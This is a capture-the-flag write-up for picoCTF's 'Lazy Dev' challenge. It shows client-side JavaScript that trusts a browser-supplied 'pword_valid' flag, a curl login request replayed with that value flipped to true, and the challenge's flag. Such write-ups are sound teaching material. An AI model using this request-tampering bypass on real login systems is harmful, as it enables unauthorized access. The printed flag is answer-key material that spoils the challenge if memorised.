# Lazy Dev

This was the Master Challenge of Level 1. In order to move to Level 2,
we had to crack this one.

Problem:

I really need to login to [this](http://shell2017.picoctf.com:35895/) website, but the developer hasn't implemented login yet. Can you help?

## Solution

On opening the chrome devtools on the website, within the `Sources` tab,
we can see a JS file called `client.js`.

```javascript
//Validate the password. TBD!
function validate(pword){
  //TODO: Implement me
  return false;
}

//Make an ajax request to the server
function make_ajax_req(input){
  var text_response;
  var http_req = new XMLHttpRequest();
  var params = "pword_valid=" + input.toString();
  http_req.open("POST", "login", true);
  http_req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http_req.onreadystatechange = function() {//Call a function when the state changes.
  	if(http_req.readyState == 4 && http_req.status == 200) {
      document.getElementById("res").innerHTML = http_req.responseText;
    }
  }
  http_req.send(params);
}

//Called when the user submits the password
function process_password(){
  var pword = document.getElementById("password").value;
  var res = validate(pword);
  var server_res = make_ajax_req(res);
}
```

Notice this line: `var params = "pword_valid=" + input.toString();`

We probably need to do a POST on the URL to which `make_ajax_req(...)`
is performing an AJAX POST request.

On clicking the Submit button, we see that an XHR request is being made.

I used Chrome devtools to get the headers, payload, etc. being passed to
`/login`. This was the entire cURL data:

```bash
curl 'http://shell2017.picoctf.com:35895/login' -H 'Pragma: no-cache' -H 'Origin: http://shell2017.picoctf.com:35895' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36' -H 'Content-type: application/x-www-form-urlencoded' -H 'Accept: */*' -H 'Cache-Control: no-cache' -H 'Referer: http://shell2017.picoctf.com:35895/' -H 'Cookie: _ga=GA1.2.139744509.1490819530' -H 'Connection: keep-alive' --data 'pword_valid=false' --compressed
```

Changing the `pword_valid=false` data to `pword_valid=true`, we get our flag:

```bash
client_side_is_the_dark_sidebde1f567656f8c9b654a1ec24e1ff889
```
